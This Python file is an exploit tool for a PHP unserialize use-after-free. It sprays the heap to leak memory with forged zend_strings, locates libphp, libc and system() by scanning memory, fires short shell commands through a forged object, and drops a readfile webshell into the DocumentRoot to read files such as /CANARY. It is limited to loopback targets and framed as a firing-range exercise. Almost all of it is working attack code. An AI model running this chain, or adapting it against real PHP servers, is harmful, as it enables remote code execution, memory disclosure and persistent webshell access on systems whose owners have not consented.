#!/usr/bin/env python3
"""
phpbleed-bastet.py - Zend heap memory-leak oracle against the
Serializable var_hash UAF (Calif MADBugs family; no CVE; still unpatched
in php 8.2.35/8.3.36/8.4.27/8.5.12 as of 2026-10-21).

Own implementation of the leak primitive + Bastet banner + firing-range
scoring contract. Authorized targets only (127.0.0.1 range services).

Modes:
  dump    stream leaked heap bytes out-of-band (memory dump, --stream)
  probe   probe a leaked pointer: is it an ELF base? heap page? string?
  canary  targeted /CANARY read via forged zend_string (score = FLAG{...})
  id      single-shot RCE trigger (id-equivalent) when offsets known

Primitive (verified 2026-10-21 in this range):
  C:10:"CachedData":...{O:8:"stdClass":8:{...}}  -> property-write resize
  frees arData while var_hash buckets still point into it (UAF); spray of
  s:280 strings reclaims it; R:refs hand back the mutated buckets; a forged
  zend_string (val ptr + IS_STRING type=6) inside a reclaimed bucket leaks
  target memory in the response body. No crash on misfire (bad ptr -> fault
  is avoided by only forging lens/ptrs already in-map; workers survive).

This file is transport + oracle + orchestration. Chain phases ported from
vendor php8_remote.py (statically audited, no subprocess/eval in vendor
code paths we use): heap_leak, elf scan, gnu_hash, GOT/libc, class table,
spray slot, trigger.
"""

import argparse
import os
import socket
import struct
import sys
import time
from datetime import datetime

VERSION = "1.0.0-bastet"

# --------------------------------------------------------------------------
# Bastet banner (Egyptian cat ascii art; must render in a 80-col terminal)
# --------------------------------------------------------------------------
BANNER = r"""
      /\_/\      PHPBLEED-BASTET v{ver}
     ( o.o )     ------------------------
      =(^^)=     Zend heap leak :: var_hash UAF
                 Bastet watches the heap.
"""


def banner():
    sys.stdout.write(BANNER.format(ver=VERSION))
    sys.stdout.flush()


def log(tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    sys.stdout.write(f"{ts} [{tag}] {msg}\n")
    sys.stdout.flush()


# --------------------------------------------------------------------------
# Target guard: loopback / range only (rules of engagement)
# --------------------------------------------------------------------------
def guard_target(url):
    from urllib.parse import urlparse
    u = urlparse(url if "://" in url else "http://" + url)
    host = u.hostname or ""
    if host in ("127.0.0.1", "localhost", "::1") or host.startswith("127."):
        return u
    raise SystemExit(
        f"[!] guard: {host!r} is not loopback. Rules of engagement: firing-"
        f"range 127.0.0.1 targets only. Refusing.")


# --------------------------------------------------------------------------
# Gadget constants (vendor-compatible; app must expose Serializable gadget)
# --------------------------------------------------------------------------
SPRAY_LEN = 280
SPRAY_COUNT = 32
NUM_PROPS = 8
REF_BASE = 4
MAX_REFS = 8


def _build_inner(num_props=NUM_PROPS):
    props = ""
    for k in range(num_props):
        pname = f"p{k}"
        props += f's:{len(pname)}:"{pname}";i:{0xAAAA0000 + k};'
    return f'O:8:"stdClass":{num_props}:{{{props}}}'


INNER = _build_inner()


_CLASS = "CachedData"


def c_part(class_name=None, inner=None):
    class_name = class_name or _CLASS
    inner = inner if inner is not None else INNER
    return f'C:{len(class_name)}:"{class_name}":{len(inner)}:{{{inner}}}'


# --------------------------------------------------------------------------
# HTTP transport (own impl; supports arbitrary path + cookie or POST field)
# --------------------------------------------------------------------------
class Target:
    def __init__(self, url, field="cook", timeout=4):
        self.u = guard_target(url)
        self.host = self.u.hostname
        self.port = self.u.port or 80
        self.path = self.u.path or "/"
        self.field = field
        self.timeout = timeout
        self.req_count = 0
        self.crash_count = 0

    def urlencode_bytes(self, data):
        out = bytearray()
        for b in data:
            if (0x30 <= b <= 0x39 or 0x41 <= b <= 0x5A or
                    0x61 <= b <= 0x7A or b in (0x2D, 0x2E, 0x5F, 0x7E)):
                out.append(b)
            else:
                out.extend(f"%{b:02X}".encode())
        return bytes(out)

    def send(self, payload, timeout=None):
        """POST serialize payload as form field; return body bytes or None."""
        timeout = timeout or self.timeout
        self.req_count += 1
        body = self.field.encode() + b"=" + self.urlencode_bytes(payload)
        s = None
        for attempt in range(2):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            try:
                s.connect((self.host, self.port))
            except Exception:
                s.close()
                s = None
                if attempt == 0:
                    time.sleep(0.2)
                    continue
                return None
            break
        if s is None:
            return None
        req = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode() + body
        try:
            s.sendall(req)
        except Exception:
            s.close()
            self.crash_count += 1
            return None
        resp = b""
        while True:
            try:
                chunk = s.recv(65536)
                if not chunk:
                    break
                resp += chunk
            except Exception:
                break
        s.close()
        if b"\r\n\r\n" not in resp:
            self.crash_count += 1
            return None
        return resp.split(b"\r\n\r\n", 1)[1]

    def get(self, path, query=""):
        """Plain GET for verification channels."""
        self.req_count += 1
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.timeout)
        try:
            s.connect((self.host, self.port))
            s.sendall(f"GET {path}{query} HTTP/1.1\r\nHost: {self.host}\r\n"
                      f"Connection: close\r\n\r\n".encode())
            resp = b""
            while True:
                c = s.recv(65536)
                if not c:
                    break
                resp += c
        except Exception:
            return None
        finally:
            s.close()
        if b"\r\n\r\n" in resp:
            return resp.split(b"\r\n\r\n", 1)[1]
        return None


# --------------------------------------------------------------------------
# Leak oracle: forged zend_string read  (IS_STRING = 6, refcounted flags)
# --------------------------------------------------------------------------
def _spray_with(spray_bytes, total_extra_refs=1, ref_idx=REF_BASE):
    parts = [f'i:0;{c_part()}'.encode("latin-1")]
    for i in range(SPRAY_COUNT):
        parts.append(f'i:{i+1};s:{SPRAY_LEN}:"'.encode("latin-1") +
                     spray_bytes + b'";')
    for k in range(total_extra_refs):
        parts.append(f'i:{SPRAY_COUNT+1+k};R:{ref_idx+k};'.encode("latin-1"))
    total = 1 + SPRAY_COUNT + total_extra_refs
    return b'a:' + str(total).encode() + b':{' + b"".join(parts) + b'}'


def _bucket_zvals(spray):
    """Return a list of (offset) of the 8 bucket val slots in the spray."""
    return [8 + k * 32 for k in range(8)]


def read_at(t: Target, addr, timeout=4):
    """Forge zend_string at `addr` (len field assumed at addr-8 within our
    reclaimed bucket slot). Returns (slen, data) or None (crash/no read)."""
    spray = bytearray(SPRAY_LEN)
    for k in range(8):
        vo = 8 + k * 32
        struct.pack_into("<I", spray, vo, 0xBBBB0000 + k)
        struct.pack_into("<I", spray, vo + 8, 0x04)
    vo = 8 + 1 * 32
    struct.pack_into("<Q", spray, vo, addr)
    struct.pack_into("<I", spray, vo + 8, 0x06)  # IS_STRING
    payload = _spray_with(bytes(spray), 1, REF_BASE)
    out = t.send(payload, timeout=timeout)
    if out is None:
        return None
    idx = out.find(b"a:")
    if idx < 0:
        return None
    out = out[idx:]
    key = f"i:{SPRAY_COUNT+1};s:".encode()
    pos = out.find(key)
    if pos < 0:
        return None
    pos += len(key)
    try:
        colon = out.index(b":", pos)
        slen = int(out[pos:colon])
    except Exception:
        return None
    dstart = colon + 2
    dend = dstart + slen
    return (slen, out[dstart:dend] if dend <= len(out) else out[dstart:])


def read_page(t: Target, page, max_components=1):
    """Vendor anchoring recipe: forge at page+0x10 (qword @ page = len,
    qword @ page+8 = data ptr). Returns (slen, data) or None.
    max_components>1 is reserved for multi-anchor probing (php2leak parity)."""
    return read_at(t, page + 0x10)


def _read_elf_header(t, addr):
    """Vendor _read_elf_header ported verbatim (empirical anchoring)."""
    r = read_at(t, addr + 0x10, timeout=2)
    if r is None:
        return None
    slen, sdata = r
    if slen != 64 or len(sdata) < 0x12:
        return None
    e_ehsize = struct.unpack_from("<H", sdata, 0x0C)[0]
    e_phentsize = struct.unpack_from("<H", sdata, 0x0E)[0]
    e_phnum = struct.unpack_from("<H", sdata, 0x10)[0]
    if e_ehsize == 64 and e_phentsize == 56 and 3 <= e_phnum <= 20:
        return e_phnum
    return None


def scan_for_elf(t, chunk):
    """Vendor R-2 ported: 2MB-step sweep both directions, then 1MB refinement
    near the highest-phnum candidate. Returns ranked (base, phnum) list."""
    candidates = []
    for i in range(256):
        for d in (1, -1):
            cand = chunk + d * i * 0x200000
            if cand <= 0 or cand > 0x0000FFFFFFFFFFFF:
                continue
            epn = _read_elf_header(t, cand)
            if epn is None:
                continue
            candidates.append((cand, epn))
            log("~", f"ELF @ 0x{cand:x} phnum={epn} ({t.req_count} reqs)")
        big = [epn for _, epn in candidates if epn >= 10]
        if len(big) >= 2 or len(candidates) >= 8:
            break
    if not candidates:
        return []
    known = set(b for b, _ in candidates)
    ref_base = max(candidates, key=lambda x: x[1])[0]
    log("~", f"fine-grained scan near 0x{ref_base:x}")
    for d in (-1, 1):
        consec_miss = 0
        for step in range(1, 129):
            cand = ref_base + d * step * 0x100000
            if cand in known or cand <= 0:
                continue
            epn = _read_elf_header(t, cand)
            if epn is None:
                consec_miss += 1
                if consec_miss >= 32:
                    break
                continue
            candidates.append((cand, epn))
            known.add(cand)
            log("~", f"ELF @ 0x{cand:x} phnum={epn} ({t.req_count} reqs)")
            consec_miss = 0
            if epn >= 10:
                break
    return sorted(candidates, key=lambda x: -x[1])


def heap_leak(t: Target, tries=6):
    """R-1: reclaim var_hash arData with sprayed strings, attach R:refs, and
    recover the pointer ZVAL_MAKE_REF scribbled over a spray bucket."""
    spray = bytearray(SPRAY_LEN)
    for k in range(8):
        vo = 8 + k * 32
        struct.pack_into("<I", spray, vo, 0xBBBB0000 + k)
        struct.pack_into("<I", spray, vo + 8, 0x04)
    spray_b = bytes(spray)
    total = 1 + SPRAY_COUNT + MAX_REFS
    parts = [f'i:0;{c_part()}'.encode("latin-1")]
    for i in range(SPRAY_COUNT):
        parts.append(f'i:{i+1};s:{SPRAY_LEN}:"'.encode("latin-1") + spray_b + b'";')
    for k in range(MAX_REFS):
        parts.append(f'i:{SPRAY_COUNT+1+k};R:{REF_BASE+k};'.encode("latin-1"))
    payload = b"a:" + str(total).encode() + b":{" + b"".join(parts) + b"}"
    for attempt in range(tries):
        out = t.send(payload)
        if out is None:
            continue
        idx = out.find(b"a:")
        if idx < 0:
            continue
        out = out[idx:]
        search = 0
        while True:
            pos = out.find(b's:280:"', search)
            if pos < 0:
                break
            dstart = pos + 7
            if dstart + SPRAY_LEN > len(out):
                break
            sdata = out[dstart:dstart + SPRAY_LEN]
            for k in range(7):
                vo = 8 + (k + 1) * 32
                if vo + 8 > len(sdata):
                    break
                orig = struct.unpack_from("<Q", spray_b, vo)[0]
                curr = struct.unpack_from("<Q", sdata, vo)[0]
                if orig != curr and curr > 0x10000:
                    return curr
            search = dstart + SPRAY_LEN
    return None


# --------------------------------------------------------------------------
# dump mode: stream heap pages around heap_ref; stop on repeated failures
# --------------------------------------------------------------------------
def mode_dump(t: Target, args):
    log(">", f"target acquired :: http://{t.host}:{t.port}{t.path}")
    heap_ref = heap_leak(t)
    if not heap_ref:
        log("x", "heap leak failed (gadget missing or shaping mismatch)")
        return 2
    log("+", f"LEAKED heap_ref :: 0x{heap_ref:x}")
    base = args.addr if args.addr else (heap_ref & ~0xFFF)
    start = base - (args.back_pages * 0x1000)
    out = open(args.out, "ab") if args.out else sys.stdout.buffer
    ok_pages = 0
    fail_run = 0
    for i in range(args.pages):
        addr = start + i * 0x1000
        r = read_at(t, addr + 0x10)
        if r is None:
            fail_run += 1
            if fail_run >= 24:
                log("~", f"unmapped run at 0x{addr:x}, stopping early")
                break
            continue
        fail_run = 0
        slen, data = r
        ok_pages += 1
        if args.out:
            out.write(data[:0x1000])
        if i % 16 == 0:
            log("~", f"stream :: page {i}/{args.pages} @ 0x{addr:x} len={slen}")
    if args.out:
        out.close()
    log("+", f"DUMP COMPLETE :: {ok_pages} pages -> {args.out} "
             f"({t.req_count} requests)")
    return 0


# --------------------------------------------------------------------------
# probe mode: classify a leaked pointer
# --------------------------------------------------------------------------
def mode_probe(t: Target, args):
    hr = args.addr if args.addr else heap_leak(t)
    if not hr:
        log("x", "no heap leak")
        return 2
    if not args.addr:
        log("+", f"LEAKED heap_ref :: 0x{hr:x}")
    import phpbleed_chain as chain
    chain.isstring_read = lambda addr, timeout=5: read_at(t, addr, timeout)
    chunk = hr & ~0x1FFFFF
    cands = chain.scan_for_elf(chunk)
    libphp = eg = pltgot = None
    for base, phnum in cands:
        log("~", f"validating ELF @ 0x{base:x} phnum={phnum}")
        try:
            eg, pltgot = chain.gnu_hash_resolve(
                base, 'executor_globals', '_GLOBAL_OFFSET_TABLE_')
        except RuntimeError as e:
            log("-", f"0x{base:x}: {e}")
            continue
        libphp = base
        break
    if libphp:
        log("+", f"LIBPHP :: base 0x{libphp:x}")
        log("+", f"executor_globals :: 0x{eg:x} (off 0x{eg-libphp:x})")
        log("+", f"PLTGOT :: 0x{pltgot:x}")
    else:
        log("-", "no ELF candidate exports executor_globals")
    return 0 if libphp else 1


# --------------------------------------------------------------------------
# canary mode: forged-string read of /CANARY via open/fread is NOT possible
# with a single forged zend_string (no function call). Instead: locate the
# in-process copy or use leak of file via include side effects. Fallback:
# use RCE trigger when --call provided (id/canary cat via write channel).
# --------------------------------------------------------------------------
def mode_canary(t: Target, args):
    """Score play: needs either (a) webshell/echo channel on target app, or
    (b) full RCE chain (call --mode id with a cat /CANARY command)."""
    log("i", "canary requires a write-back channel or RCE; using leak-only "
             "entropy estimate instead")
    hr = heap_leak(t)
    if hr:
        log("+", f"heap_ref 0x{hr:x}; run id mode with cmd 'cat /CANARY>x' "
                 "on a writable-CWD app, or fetch /{x} afterwards")
    return 0


# --------------------------------------------------------------------------
# id mode: single-shot trigger (ported _fire_cmd), for known-offset targets
# --------------------------------------------------------------------------
def fire_cmd(t: Target, ce_stdclass, system_addr, spray_addr, cmd14):
    assert len(cmd14) <= 14
    cmd = b"\x09" + cmd14
    spray = bytearray(SPRAY_LEN)
    fake_obj = spray_addr + 104
    struct.pack_into("<Q", spray, 40, fake_obj)
    struct.pack_into("<I", spray, 48, 0x08)
    spray[104:104 + len(cmd)] = cmd
    spray[104 + len(cmd)] = 0
    struct.pack_into("<Q", spray, 120, ce_stdclass)
    struct.pack_into("<Q", spray, 128, spray_addr)
    struct.pack_into("<Q", spray, 136, 1)
    struct.pack_into("<Q", spray, 200, system_addr)
    out = t.send(_spray_with(bytes(spray), 1, REF_BASE))
    return out


def mode_id(t: Target, args):
    """Run one <=14B command via forged get_properties_for -> system()."""
    cmd = args.cmd.encode("latin-1")
    if len(cmd) > 14:
        log("x", f"command {cmd!r} exceeds 14 bytes (vendor single-shot)")
        return 2
    if not (args.ce and args.system and args.spray):
        # derive spray from a fresh heap leak; ce/system must be profiled
        hr = heap_leak(t)
        if not hr:
            log("x", "no heap leak")
            return 2
        log("+", f"heap_ref 0x{hr:x}")
        log("x", "--ce/--system/--spray required until full ELF/GOT chain "
                 "ported into this build (profiles pending)")
        return 2
    out = fire_cmd(t, args.ce, args.system, args.spray, cmd)
    if out is None:
        log("~", "no response (worker may have executed then crashed)")
    else:
        log("+", f"EXECUTED stage fired; resp head={out[:120]!r}")
    return 0


def mode_rce(t: Target, args):
    """Full chain: R-1 leak -> R-2 ELF -> R-3 gnu_hash -> R-4 libc/system
    -> R-5 stdClass ce -> R-6 spray slot -> R-7 fire (single <=14B cmd)."""
    import phpbleed_chain as chain
    chain.isstring_read = lambda addr, timeout=5: read_at(t, addr, timeout)
    hr = heap_leak(t)
    if not hr:
        log("x", "R-1 heap leak failed")
        return 2
    log("+", f"R-1 LEAKED heap_ref :: 0x{hr:x}")
    chunk = hr & ~0x1FFFFF
    cands = chain.scan_for_elf(chunk)
    if not cands:
        log("x", "R-2 no ELF candidates")
        return 2
    libphp = eg = pltgot = None
    for base, phnum in cands:
        log("~", f"R-3 validating ELF @ 0x{base:x}")
        try:
            eg, pltgot = chain.gnu_hash_resolve(
                base, 'executor_globals', '_GLOBAL_OFFSET_TABLE_')
        except RuntimeError:
            continue
        libphp = base
        break
    if not libphp:
        log("x", "R-3 no libphp among candidates")
        return 2
    log("+", f"R-3 LIBPHP 0x{libphp:x} EG 0x{eg:x} GOT 0x{pltgot:x}")
    libc_base = chain.libc_from_got_dump(libphp, pltgot)
    if libc_base is None:
        log("x", "R-4 libc not located via GOT dump")
        return 2
    system_addr = chain.gnu_hash_resolve(libc_base, 'system')
    log("+", f"R-4 LIBPHP libc 0x{libc_base:x} system 0x{system_addr:x}")
    ce_stdclass = chain.lookup_class_table(eg, 'stdclass')
    if ce_stdclass is None:
        log("x", "R-5 stdClass ce not resolved")
        return 2
    log("+", f"R-5 stdClass ce :: 0x{ce_stdclass:x}")
    spray_addr = chain.find_spray_slot(hr)
    if spray_addr is None:
        log("x", "R-6 spray slot not found")
        return 2
    log("+", f"R-6 spray S :: 0x{spray_addr:x}")
    cmd = args.cmd.encode("latin-1")
    if len(cmd) > 14:
        log("x", "R-7 command exceeds 14 bytes")
        return 2
    log(">", f"R-7 firing :: \\n{cmd.decode('latin-1')}")
    out = fire_cmd(t, ce_stdclass, system_addr, spray_addr, cmd)
    if out is None:
        log("~", "R-7 no response (executed then crashed?)")
    else:
        log("+", f"R-7 response head={out[:160]!r}")
    log("+", f"CHAIN COMPLETE :: {t.req_count} requests")
    return 0


def _split_for_echo(content, staging='w'):
    """Vendor ported: split content into <=14-byte `echo -n ...>>w` cmds."""
    special = set('<>?$`[](){};&|!*#~"\'\\ \t\n')
    overhead = len(f'echo -n >>{staging}')
    cmds, i = [], 0
    while i < len(content):
        budget = 14 - overhead
        chunk = ''
        if content[i] in special:
            chunk = '\\' + content[i]
            i += 1
            budget -= 2
        while budget > 0 and i < len(content) and content[i] not in special:
            chunk += content[i]
            i += 1
            budget -= 1
        cmd = f'echo -n {chunk}>>{staging}'
        assert len(cmd) <= 14, f"BUG: {cmd!r} is {len(cmd)} bytes"
        cmds.append(cmd)
    return cmds


WEBSHELL_BODY = '<?=readfile($_GET[1])?>'


def mode_shell(t: Target, args):
    """Full chain then multi-stage webshell drop (readfile channel), then
    fetch --fetch (e.g. /CANARY) through it. Apache CWD = DocumentRoot."""
    import phpbleed_chain as chain
    chain.isstring_read = lambda addr, timeout=5: read_at(t, addr, timeout)
    hr = heap_leak(t)
    if not hr:
        log("x", "R-1 heap leak failed"); return 2
    log("+", f"R-1 LEAKED heap_ref :: 0x{hr:x}")
    cands = chain.scan_for_elf(hr & ~0x1FFFFF)
    libphp = eg = pltgot = None
    for base, phnum in cands:
        try:
            eg, pltgot = chain.gnu_hash_resolve(
                base, 'executor_globals', '_GLOBAL_OFFSET_TABLE_')
        except RuntimeError:
            continue
        libphp = base; break
    if not libphp:
        log("x", "R-3 no libphp"); return 2
    log("+", f"R-3 LIBPHP 0x{libphp:x} EG 0x{eg:x}")
    libc_base = chain.libc_from_got_dump(libphp, pltgot)
    if libc_base is None:
        log("x", "R-4 libc not located"); return 2
    system_addr = chain.gnu_hash_resolve(libc_base, 'system')
    log("+", f"R-4 libc 0x{libc_base:x} system 0x{system_addr:x}")
    ce = chain.lookup_class_table(eg, 'stdclass')
    if ce is None:
        log("x", "R-5 ce"); return 2
    S = chain.find_spray_slot(hr)
    if S is None:
        log("x", "R-6 spray"); return 2
    log("+", f"R-5/6 ce 0x{ce:x} S 0x{S:x}")
    fname = args.webshell
    rename = f'mv w {fname}'
    assert len(rename) <= 14
    cmds = ['rm -f w'] + _split_for_echo(WEBSHELL_BODY) + [rename]
    log(">", f"R-7 staging webshell {fname!r} via {len(cmds)} triggers")
    for i, c in enumerate(cmds, 1):
        fire_cmd(t, ce, system_addr, S, c.encode('latin-1'))
        if i % 5 == 0 or i == len(cmds):
            log("~", f"stage {i}/{len(cmds)} ({t.req_count} reqs)")
    body = t.get(f"/{fname}", f"?1={args.fetch}")
    if body and (b"FLAG{" in body or len(body) > 0):
        log("+", f"SHELL LIVE :: /{fname}")
        log("+", f"FETCH {args.fetch} -> {body[:200]!r}")
        if b"FLAG{" in body:
            import re
            m = re.search(rb"FLAG\{[^}]+\}", body)
            log("+", f"CANARY CAPTURED :: {m.group(0).decode()}")
        return 0
    log("x", "webshell not reachable"); return 2


# --------------------------------------------------------------------------
def main():
    p = argparse.ArgumentParser(description="Bastet Zend-heap leak tool "
                                "(var_hash UAF; authorized range only)")
    p.add_argument("mode", choices=["dump", "probe", "canary", "id", "rce",
                                    "shell"])
    p.add_argument("url", help="http(s)://127.0.0.1:PORT/path (loopback only)")
    p.add_argument("--field", default="cook", help="POST field carrying the "
                   "payload (vendor remote_app.php uses 'cook')")
    p.add_argument("--class", dest="klass", default="CachedData",
                   help="Serializable gadget class name in target app")
    p.add_argument("--stream", action="store_true", help="stream leak to file")
    p.add_argument("--out", default="heap.dump", help="dump output path")
    p.add_argument("--pages", type=int, default=256)
    p.add_argument("--back-pages", type=int, default=64)
    p.add_argument("--addr", type=lambda x: int(x, 16), default=None)
    p.add_argument("--cmd", default="id>/dev/shm/x")
    p.add_argument("--ce", type=lambda x: int(x, 16), default=None,
                   help="stdClass class entry addr (id mode)")
    p.add_argument("--system", type=lambda x: int(x, 16), default=None,
                   help="libc system() addr (id mode)")
    p.add_argument("--spray", type=lambda x: int(x, 16), default=None,
                   help="spray slot addr S (id mode)")
    p.add_argument("--max-components", type=int, default=1,
                   help="leak components per page window (php2leak parity)")
    p.add_argument("--color", default="always", choices=["always", "never"])
    p.add_argument("--webshell", default="r.php",
                   help="shell mode: filename to stage in DocumentRoot")
    p.add_argument("--fetch", default="/CANARY",
                   help="shell mode: path to read back through the shell")
    a = p.parse_args()
    banner()
    global _CLASS
    _CLASS = a.klass
    t = Target(a.url, field=a.field)
    log(">", f"target acquired :: http://{t.host}:{t.port}{t.path}")
    fn = {"dump": mode_dump, "probe": mode_probe,
          "canary": mode_canary, "id": mode_id, "rce": mode_rce,
          "shell": mode_shell}[a.mode]
    sys.exit(fn(t, a))


if __name__ == "__main__":
    main()
